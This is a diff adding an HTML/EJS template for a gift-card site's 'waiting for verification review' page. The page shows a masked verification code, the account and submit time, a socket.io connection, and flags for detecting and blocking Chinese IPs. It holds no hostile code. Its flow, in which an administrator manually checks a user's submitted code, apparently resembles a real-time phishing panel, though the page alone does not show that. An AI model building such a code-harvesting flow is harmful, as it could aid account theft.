@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="<%= recommendLang || 'zh' %>">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/v2/css/tailwind.min.css">
+  <link rel="stylesheet" href="/v2/css/font-awesome.min.css">
+  <style>
+    /* 基础样式与其他页面保持一致 */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+    }
+
+    body {
+      background-color: #fff;
+      color: #333;
+      line-height: 1.6;
+    }
+
+    /* 等待动画 */
+    .waiting-spinner {
+      width: 60px;
+      height: 60px;
+      border: 4px solid rgba(52, 199, 89, 0.1);
+      border-top-color: #34c759;
+      border-radius: 50%;
+      animation: spin 1s ease-in-out infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* 脉冲动画 */
+    .pulse-animation {
+      animation: pulse 2s ease-in-out infinite;
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.8; }
+    }
+
+    /* 状态消息样式 */
+    .status-message {
+      background: linear-gradient(135deg, #f0fff4 0%, #e6fffa 100%);
+      border: 1px solid #c3f0ca;
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin: 1rem 0;
+    }
+
+    /* 步骤指示器 */
+    .steps-indicator {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 2rem;
+    }
+    
+    .step {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background-color: #e8e8ed;
+      margin: 0 4px;
+    }
+    
+    .step.active {
+      background-color: #0071e3;
+    }
+    
+    .step.current {
+      background-color: #34c759;
+      animation: pulse 1.5s ease-in-out infinite;
+    }
+
+    /* 验证码显示 */
+    .verification-code-display {
+      background: linear-gradient(135deg, #007AFF 0%, #5856D6 100%);
+      color: white;
+      border-radius: 16px;
+      padding: 1.5rem;
+      text-align: center;
+      font-family: 'SF Mono', Monaco, 'Consolas', monospace;
+      margin: 1rem 0;
+    }
+
+    /* 语言选择器 */
+    .language-selector {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 100;
+    }
+    
+    .language-selector select {
+      background: white;
+      border: 1px solid #ddd;
+      border-radius: 20px;
+      padding: 8px 16px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    /* 进度指示器 */
+    .progress-indicator {
+      background: linear-gradient(135deg, #FF9500 0%, #FF6B35 100%);
+      color: white;
+      border-radius: 12px;
+      padding: 1rem;
+      text-align: center;
+      margin: 1rem 0;
+    }
+  </style>
+  <script>
+    const recommendLang = "<%= recommendLang || 'zh' %>";
+    const isChineseIP = <%= isChineseIP ? 'true' : 'false' %>;
+    const blockChineseIP = <%= blockChineseIP ? 'true' : 'false' %>;
+  </script>
+  <script src="/socket.io/socket.io.js"></script>
+  <title data-i18n="waiting_verification_title">等待验证审核 - 礼品卡系统</title>
+</head>
+
+<body>
+  <!-- 语言选择器 -->
+  <div class="language-selector">
+    <select id="languageSelect">
+      <option value="zh" data-i18n="lang_zh">中文</option>
+      <option value="en" data-i18n="lang_en">English</option>
+      <option value="ja" data-i18n="lang_ja">日本語</option>
+      <option value="ko" data-i18n="lang_ko">한국어</option>
+    </select>
+  </div>
+
+  <!-- 顶部导航 -->
+  <header class="fixed top-0 left-0 right-0 bg-white/80 backdrop-blur-sm border-b border-gray-200 z-50">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex items-center justify-between h-16">
+        <button id="back-btn" class="text-gray-800">
+          <i class="fa fa-arrow-left"></i> <span data-i18n="back">返回</span>
+        </button>
+        <div class="flex items-center">
+          <img src="/v2/images/logo.png" alt="礼品卡风格图标" class="h-8 w-auto mr-2">
+          <span class="text-lg font-semibold" data-i18n="site_name">GiftCard</span>
+        </div>
+        <div class="w-16"></div> <!-- 占位，保持居中 -->
+      </div>
+    </div>
+  </header>
+
+  <!-- 等待验证审核区域 -->
+  <section class="py-32 bg-white min-h-screen">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="max-w-md mx-auto text-center">
+        
+        <!-- 等待动画 -->
+        <div class="mb-8">
+          <div class="waiting-spinner mx-auto mb-6"></div>
+          <div class="pulse-animation">
+            <h2 class="text-2xl font-bold mb-2" data-i18n="waiting_verification">等待验证审核</h2>
+            <p class="text-gray-600" data-i18n="verification_pending_message">您的验证码已提交，请等待管理员确认...</p>
+          </div>
+        </div>
+        
+        <!-- 步骤指示器 -->
+        <div class="steps-indicator">
+          <div class="step active"></div>
+          <div class="step active"></div>
+          <div class="step current"></div>
+        </div>
+        
+        <!-- 验证码显示 -->
+        <div class="verification-code-display">
+          <div class="flex items-center justify-center mb-2">
+            <i class="fa fa-shield text-2xl mr-3"></i>
+            <span class="text-lg font-medium" data-i18n="your_verification_code">您的验证码</span>
+          </div>
+          <div id="verification-code-value" class="text-3xl font-bold tracking-wider">
+            ••••••
+          </div>
+        </div>
+        
+        <!-- 进度指示 -->
+        <div class="progress-indicator">
+          <div class="flex items-center justify-center">
+            <i class="fa fa-hourglass-half mr-2"></i>
+            <span data-i18n="processing_verification">正在处理验证请求</span>
+          </div>
+        </div>
+        
+        <!-- 状态信息 -->
+        <div class="status-message">
+          <div class="flex items-center justify-between mb-3">
+            <div class="flex items-center">
+              <i class="fa fa-user text-green-600 mr-2"></i>
+              <span class="text-sm text-gray-600" data-i18n="account">账户:</span>
+            </div>
+            <span id="user-account" class="text-sm font-medium"></span>
+          </div>
+          
+          <div class="flex items-center justify-between mb-3">
+            <div class="flex items-center">
+              <i class="fa fa-clock-o text-green-600 mr-2"></i>
+              <span class="text-sm text-gray-600" data-i18n="submit_time">提交时间:</span>
+            </div>
+            <span id="verification-submit-time" class="text-sm font-medium"></span>
+          </div>
+          
+          <div class="flex items-center justify-between">
+            <div class="flex items-center">
+              <i class="fa fa-info-circle text-green-600 mr-2"></i>
+              <span class="text-sm text-gray-600" data-i18n="status">状态:</span>
+            </div>
+            <span id="verification-status" class="text-sm font-medium text-green-600" data-i18n="pending_verification">等待验证审核</span>
+          </div>
+        </div>
+        
+        <!-- 提示信息 -->
+        <div class="mt-8 p-4 bg-green-50 border border-green-200 rounded-lg">
+          <div class="flex items-start">
+            <i class="fa fa-check-circle text-green-600 mt-1 mr-3"></i>
+            <div class="text-left">
+              <h4 class="text-sm font-medium text-green-800 mb-1" data-i18n="almost_done">即将完成</h4>
+              <ul class="text-sm text-green-700 space-y-1">
+                <li data-i18n="verification_tip1">• 管理员正在验证您提交的验证码</li>
+                <li data-i18n="verification_tip2">• 验证通过后将自动发放礼品卡</li>
+                <li data-i18n="verification_tip3">• 请耐心等待，通常几分钟内完成</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        
+        <!-- 操作按钮 -->
+        <div class="mt-8">
+          <button id="back-to-verification" class="w-full py-3 px-6 bg-gray-100 text-gray-700 rounded-full hover:bg-gray-200 transition-colors">
+            <i class="fa fa-edit mr-2"></i>
+            <span data-i18n="modify_verification">修改验证码</span>
+          </button>
+        </div>
+        
+      </div>
+    </div>
+  </section>
+
+  <!-- 页脚 -->
+  <footer class="bg-gray-100 py-12 border-t border-gray-200">
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="text-center text-sm text-gray-600">
+        <p>&copy; 2023 GiftCard. <span data-i18n="all_rights_reserved">保留所有权利。</span></p>
+      </div>
+    </div>
+  </footer>
+
+  <script src="/js/i18n.js?v=<%= Date.now() %>"></script>
+  <script src="/v2/js/app.js?v=<%= Date.now() %>"></script>
+</body>
+</html>
